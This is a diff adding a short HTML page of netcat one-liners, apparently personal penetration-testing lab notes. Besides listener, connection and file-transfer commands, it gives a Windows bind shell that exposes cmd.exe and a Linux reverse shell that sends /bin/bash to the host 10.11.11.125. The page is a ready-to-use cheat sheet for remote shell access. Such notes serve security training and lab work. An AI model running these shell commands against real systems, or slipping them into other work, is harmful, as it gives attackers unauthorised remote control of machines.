@@ -1,0 +1,23 @@
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
+<html xmlns="http://www.w3.org/1999/xhtml">
+<head>
+<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
+<title>Netcat</title>
+</head><body><br/>
+## server start listener for communication on port 4444<br/>
+nc -nlvp 4444<br/>
+<br/>
+## client start communication with server at port 4444<br/>
+nc -nv 10.11.11.125 4444<br/>
+<br/>
+## Recieve a file using nc<br/>
+nc -nlvp 4445 file.file<br/>
+<br/>
+## Send a file using nc<br/>
+nc -nv 10.11.11.125 4445 &lt;/usr/share/windows-binaries/file.exe<br/>
+<br/>
+## Bind Shell on windows --executed on the computer to be controlled<br/>
+nc -nlvp 4445 -e cmd.exe<br/>
+<br/>
+## Reverse Shell on Linux<br/>
+nc -nv 10.11.11.125 4445 -e /bin/bash</body></html>
